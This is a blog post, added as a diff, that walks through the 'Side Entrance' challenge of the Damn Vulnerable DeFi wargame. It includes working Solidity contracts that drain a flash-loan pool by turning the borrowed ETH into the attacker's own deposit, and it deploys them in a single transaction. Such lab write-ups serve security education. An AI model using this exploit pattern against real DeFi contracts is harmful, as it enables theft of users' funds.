@@ -1,0 +1,116 @@
+---
+isDraft: false
+title: 'Damn Vulnerable DeFi Challenge #4 Solution'
+description: 'Explanation of solution to Damn Vulnerable Defi Challenge #4: Side Entrance'
+tags: ['defi', 'solidity']
+series: 'Damn Vulnerable DeFi'
+publishDate: 'Oct 10, 2023 06:45 PM'
+---
+
+import Quote from '../../../components/Quote.mdx'
+import FormattedDate from '../../../components/FormattedDate'
+
+# {frontmatter.title}
+
+<Quote />
+
+*Published <FormattedDate client:only="react" date={props.date} />*
+
+> ## Challenge #4 - Side Entrance
+>
+> A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.
+>
+> It has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.
+>
+> Starting with 1 ETH in balance, pass the challenge by taking all ETH from the pool.
+
+`SideEntranceLenderPool` keeps track of all accounts' balances inside of the `balances` mapping. We can increment our balance through the `deposit` function. The `flashLoan` function gives us access to the pool's whole balance as long as we repay by the end of its execution.
+
+Notably, this contract does not employ any sort of reentrancy protection. We can create a contract that takes the pool's balance, deposits it back into the pool, and therefore assigns it to its own address in the `balances` mapping. This keeps the pool's balance the same, satisfying the condition that the pool cannot have less ETH than what it had before the flash loan.
+
+```solidity
+// contracts/side-entrance/FlashLoanEtherReceiver.sol
+
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+import "./SideEntranceLenderPool.sol";
+
+contract FlashLoanEtherReceiver {
+    function infiltrate(
+        SideEntranceLenderPool pool,
+        uint256 amount
+    ) public {
+        pool.flashLoan(amount);
+
+        pool.withdraw();
+
+        payable(msg.sender).transfer(amount);
+    }
+
+    function execute() external payable {
+        SideEntranceLenderPool(msg.sender).deposit{
+            value: msg.value
+        }();
+    }
+
+    receive() external payable {}
+}
+```
+
+This works, but it would be much more epic and cool if we could infiltrate the pool in a single transaction, rather than first deploying and then calling a function.
+
+The body of the `infiltrate` function cannot simply be transferred to the `constructor` of a contract. The pool calls `execute` on `msg.sender` when we call `pool.flashLoan(amount)`. The contract would still be initializing, and its runtime code would not be available. `flashLoan` would revert because the contract's `execute` function would not exist yet.
+
+We can deploy `FlashLoanEtherReceiver` from another contract and call `infiltrate` atomically.
+
+```solidity
+// contracts/side-entrance/FlashLoanEtherReceiverDeployer.sol
+
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+import "./FlashLoanEtherReceiver.sol";
+
+contract FlashLoanEtherReceiverDeployer {
+    constructor(SideEntranceLenderPool pool, uint256 amount) {
+        new FlashLoanEtherReceiver().infiltrate(pool, amount);
+    }
+}
+```
+
+We just need to change where the ETH will be transferred. `msg.sender` is the deployer now, and it cannot accept transfers to it without a `receive` function. We could add it in and implement a `withdraw` function, but I opted to change the `infiltrate` function.
+
+```solidity
+function infiltrate(
+    SideEntranceLenderPool pool,
+    uint256 amount
+) public {
+    pool.flashLoan(amount);
+
+    pool.withdraw();
+
+    // `msg.sender` is the address that calls `infiltrate`.
+    // `FlashLoanEtherReceiverDeployer` in this case.
+    //
+    // `tx.origin` is the externally owned account that starts the whole transaction.
+    payable(tx.origin).transfer(amount);
+}
+```
+
+Now all we have to do is deploy `FlashLoanEtherReceiverDeployer` and pass in the pool and the amount as arguments. This solution does not even use our own balance! (except for gas, of course)
+
+```js
+// test/side-entrance/side-entrance.challenge.js
+
+it('Execution', async function () {
+  await (
+    await ethers.getContractFactory(
+      'FlashLoanEtherReceiverDeployer',
+      player
+    )
+  ).deploy(pool.address, ETHER_IN_POOL)
+})
+```
